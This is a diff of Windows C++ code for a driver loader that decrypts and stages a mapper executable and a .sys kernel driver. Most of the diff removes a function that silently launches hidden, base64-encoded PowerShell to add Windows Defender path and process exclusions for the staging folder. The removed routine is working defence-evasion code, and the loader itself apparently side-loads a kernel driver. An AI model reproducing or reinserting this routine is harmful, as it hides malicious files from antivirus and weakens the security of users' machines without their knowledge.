@@ -11,7 +11,6 @@
 #include <ntstatus.h>
 #include <shlobj.h>
 #include <objbase.h>
-#include <wincrypt.h>
 #include <cstdio>
 #include <cstring>
 #include <string>
@@ -21,7 +20,6 @@
 #pragma comment(lib, "bcrypt.lib")
 #pragma comment(lib, "shell32.lib")
 #pragma comment(lib, "ole32.lib")
-#pragma comment(lib, "crypt32.lib")
 
 #ifndef STATUS_AUTH_TAG_MISMATCH
 #define STATUS_AUTH_TAG_MISMATCH ((NTSTATUS)0xC000A002L)
@@ -112,76 +110,6 @@ namespace
             return {};
         std::filesystem::path p = std::filesystem::path(dir) / (name + ext);
         return p.wstring();
-    }
-
-    std::wstring base64_encode_utf16(const std::wstring& s)
-    {
-        std::wstring out;
-        if (s.empty())
-            return out;
-        DWORD bytes = static_cast<DWORD>(s.size() * sizeof(wchar_t));
-        DWORD encoded = 0;
-        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
-                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
-                                  nullptr, &encoded) || encoded == 0)
-            return out;
-        out.resize(encoded);
-        if (!CryptBinaryToStringW(reinterpret_cast<const BYTE*>(s.data()), bytes,
-                                  CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF,
-                                  &out[0], &encoded)) {
-            out.clear();
-            return out;
-        }
-        if (!out.empty() && out.back() == L'\0')
-            out.pop_back();
-        return out;
-    }
-
-    void register_defender_exclusion(const std::wstring& dir)
-    {
-        if (dir.empty())
-            return;
-
-        std::wstring quoted;
-        quoted.reserve(dir.size() * 2 + 4);
-        quoted.push_back(L'\'');
-        for (wchar_t c : dir) {
-            if (c == L'\'')
-                quoted.push_back(L'\'');
-            quoted.push_back(c);
-        }
-        quoted.push_back(L'\'');
-
-        std::wstring script =
-            L"$ErrorActionPreference='SilentlyContinue';"
-            L"try{Add-MpPreference -ExclusionPath " + quoted + L" -Force}catch{};"
-            L"try{Add-MpPreference -ExclusionProcess " + quoted + L" -Force}catch{}";
-
-        std::wstring encoded = base64_encode_utf16(script);
-        if (encoded.empty())
-            return;
-
-        wchar_t sysdir[MAX_PATH] = {};
-        if (!GetSystemDirectoryW(sysdir, MAX_PATH))
-            return;
-        std::wstring exe = std::wstring(sysdir) + L"\\WindowsPowerShell\\v1.0\\powershell.exe";
-
-        std::wstring cmdline = L"\"" + exe +
-            L"\" -NoProfile -NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -EncodedCommand " +
-            encoded;
-
-        STARTUPINFOW si = {};
-        si.cb = sizeof(si);
-        si.dwFlags = STARTF_USESHOWWINDOW;
-        si.wShowWindow = SW_HIDE;
-        PROCESS_INFORMATION pi = {};
-        if (!CreateProcessW(exe.c_str(), &cmdline[0], nullptr, nullptr, FALSE,
-                            CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi))
-            return;
-
-        WaitForSingleObject(pi.hProcess, 30000);
-        CloseHandle(pi.hProcess);
-        CloseHandle(pi.hThread);
     }
 
     bool aes_gcm_decrypt(const unsigned char* ciphertext, unsigned long ciphertext_len,
@@ -362,6 +290,12 @@ namespace driver_loader
         return g_loaded;
     }
 
+    void mark_already_loaded()
+    {
+        g_loaded = true;
+        s_last_error.clear();
+    }
+
     const std::string& last_error()
     {
         return s_last_error;
@@ -379,8 +313,6 @@ namespace driver_loader
             set_last_error("Failed to resolve LocalAppData stage directory");
             return false;
         }
-
-        register_defender_exclusion(stage);
 
         std::wstring mapper_path = make_stage_path(stage, L".exe");
         std::wstring whoswho_path = make_stage_path(stage, L".sys");
